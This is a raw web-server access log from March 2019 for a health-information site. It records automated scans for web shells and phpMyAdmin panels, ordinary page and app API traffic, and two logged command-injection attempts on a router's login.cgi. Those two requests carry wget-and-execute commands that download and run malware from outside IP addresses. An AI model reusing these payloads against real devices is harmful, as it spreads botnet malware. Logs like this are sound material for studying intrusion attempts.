103.230.241.81 - - [24/Mar/2019:20:49:29 +0000] "POST /wcp.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:30 +0000] "POST /u.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:31 +0000] "POST /uuu.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:31 +0000] "POST /sss.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:32 +0000] "POST /ss.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:32 +0000] "POST /sss.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:33 +0000] "POST /mazi.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:41 +0000] "POST /phpini.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:42 +0000] "POST /1.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:46 +0000] "POST /2.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:46 +0000] "POST /core.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:49 +0000] "POST /qaz.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:50 +0000] "POST /sha.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:50 +0000] "POST /ppx.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:53 +0000] "POST /1.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:54 +0000] "POST /confg.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:55 +0000] "POST /conf1g.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:49:58 +0000] "POST /confg.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:50:14 +0000] "POST /confg.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:50:18 +0000] "GET /index.php HTTP/1.1" 200 6070 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:50:22 +0000] "GET /phpMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:50:22 +0000] "GET /pmd/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:50:25 +0000] "GET /pma/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:50:30 +0000] "GET /PMA2/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:50:33 +0000] "GET /pmamy/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:50:53 +0000] "GET /pmamy2/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:50:57 +0000] "GET /mysql/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:50:58 +0000] "GET /admin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:01 +0000] "GET /db/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:02 +0000] "GET /dbadmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:03 +0000] "GET /web/phpMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:03 +0000] "GET /admin/pma/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:06 +0000] "GET /admin/PMA/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:06 +0000] "GET /admin/mysql/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:07 +0000] "GET /admin/mysql2/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:08 +0000] "GET /admin/phpmyadmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:09 +0000] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:10 +0000] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:11 +0000] "GET /mysqladmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:13 +0000] "GET /mysql-admin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:14 +0000] "GET /mysql_admin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:15 +0000] "GET /phpadmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:15 +0000] "GET /phpAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:16 +0000] "GET /phpmyadmin0/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
201.150.151.253 - - [24/Mar/2019:20:51:17 +0000] "GET / HTTP/1.1" 200 6068 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
103.230.241.81 - - [24/Mar/2019:20:51:19 +0000] "GET /phpmyadmin1/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:19 +0000] "GET /phpmyadmin2/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:20 +0000] "GET /phpMyAdmin-4.4.0/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:21 +0000] "GET /myadmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:26 +0000] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:26 +0000] "GET /phpMyadmin_bak/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:30 +0000] "GET /www/phpMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:30 +0000] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:31 +0000] "GET /phpmyadmin-old/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:33 +0000] "GET /phpMyAdmin.old/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:34 +0000] "GET /pma-old/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:35 +0000] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:37 +0000] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:38 +0000] "GET /phpma/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:39 +0000] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:39 +0000] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:42 +0000] "GET /phpMyAbmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:42 +0000] "GET /phpMyAdmin__/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:43 +0000] "GET /phpMyAdmin+++---/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:43 +0000] "GET /v/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:44 +0000] "GET /phpmyadm1n/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:47 +0000] "GET /phpMyAdm1n/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:48 +0000] "GET /shaAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:51:49 +0000] "GET /phpMyadmi/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:02 +0000] "GET /s/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:05 +0000] "GET /phpMyAdmin1/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:06 +0000] "GET /phpMyAdmin123/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:07 +0000] "GET /pwd/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:10 +0000] "GET /phpMyAdmina/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:10 +0000] "GET /phpMydmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:14 +0000] "GET /phpMyAdmins/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:17 +0000] "GET /phpMyAdmin._/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:20 +0000] "GET /phpmyadmin2222/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:20 +0000] "GET /php2MyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:21 +0000] "GET /phpiMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:25 +0000] "GET /phpNyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:30 +0000] "GET /program/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:30 +0000] "GET /shopdb/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:33 +0000] "GET /phppma/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:34 +0000] "GET /phpmy/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:35 +0000] "GET /mysql/admin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:38 +0000] "GET /mysql/sqlmanager/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:38 +0000] "GET /mysql/mysqlmanager/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:39 +0000] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
103.230.241.81 - - [24/Mar/2019:20:52:40 +0000] "GET /manager/html HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
92.112.21.171 - - [24/Mar/2019:20:58:01 +0000] "GET / HTTP/1.1" 200 6068 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
110.24.36.98 - - [24/Mar/2019:21:04:30 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.244.25.108/bins/Solstice.mips%20-O%20->%20/tmp/.Solstice;chmod%20777%20/tmp/.Solstice;/tmp/.Solstice%20dlink.mips%27$ HTTP/1.1" 400 0 "-" "Solstice/2.0"
45.124.15.48 - - [24/Mar/2019:21:12:47 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://147.135.121.113/d%20-O%20-%3E%20/tmp/ff;chmod%20+x%20/tmp/ff;sh%20/tmp/ff%27$ HTTP/1.1" 400 0 "-" "Hello, World/2.0"
178.73.215.171 - - [24/Mar/2019:21:22:45 +0000] "GET / HTTP/1.0" 200 6052 "-" "-"
154.125.162.32 - - [24/Mar/2019:21:28:22 +0000] "POST /api/user/signup/ HTTP/1.1" 200 409 "-" "Dalvik/2.1.0 (Linux; U; Android 5.1; itel it1508 Build/LMY47D)"
154.125.162.32 - - [24/Mar/2019:21:28:26 +0000] "GET /api/articles/get-articles-by-category/General%20Health?token=057910662cfa966147bb HTTP/1.1" 200 28754 "-" "Dalvik/2.1.0 (Linux; U; Android 5.1; itel it1508 Build/LMY47D)"
154.125.162.32 - - [24/Mar/2019:21:29:43 +0000] "GET /api/health-resources/fetch?token=057910662cfa966147bb HTTP/1.1" 200 2186 "-" "Dalvik/2.1.0 (Linux; U; Android 5.1; itel it1508 Build/LMY47D)"
154.125.162.32 - - [24/Mar/2019:21:30:19 +0000] "GET /api/health-resources/fetch?token=057910662cfa966147bb HTTP/1.1" 200 2186 "-" "Dalvik/2.1.0 (Linux; U; Android 5.1; itel it1508 Build/LMY47D)"
192.227.216.45 - - [24/Mar/2019:21:56:54 +0000] "GET /air-jordan-2-uk/ HTTP/1.1" 404 10547 "http://www.veronarisuona.it/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0.4 Waterfox/56.0.4"
192.227.216.45 - - [24/Mar/2019:21:56:55 +0000] "GET / HTTP/1.1" 200 2174 "http://www.veronarisuona.it" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0.4 Waterfox/56.0.4"
89.136.31.222 - - [24/Mar/2019:22:52:38 +0000] "GET / HTTP/1.1" 200 6160 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:39 +0000] "GET /images/doctors.svg HTTP/1.1" 200 45452 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:39 +0000] "GET /images/logo.png HTTP/1.1" 200 135674 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:40 +0000] "GET /js/bootstrap.bundle.min.js HTTP/1.1" 200 68036 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:41 +0000] "GET /js/config.js HTTP/1.1" 200 372 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:41 +0000] "GET /js/constants.js HTTP/1.1" 200 1869 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:42 +0000] "GET /js/index.js HTTP/1.1" 200 1459 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:42 +0000] "GET /js/iziToast.min.js HTTP/1.1" 200 18768 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:42 +0000] "GET /js/jquery-2.1.4.min.js HTTP/1.1" 200 84633 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:43 +0000] "GET /js/main.js HTTP/1.1" 200 2306 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:43 +0000] "GET /js/modernizr.js HTTP/1.1" 200 53044 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:44 +0000] "GET /js/pace.min.js HTTP/1.1" 200 12650 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:44 +0000] "GET /js/plugins.js HTTP/1.1" 200 63885 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:45 +0000] "GET /js/+g)},T.setElementContent=function(e,n){var i=this.config.html;" 400 0 "-" "-"
89.136.31.222 - - [24/Mar/2019:22:52:45 +0000] "GET /js/,data:b}).done(function(a){f=arguments,g.html(d?n( HTTP/1.1" 404 10539 "-" "Java/1.6.0_04"
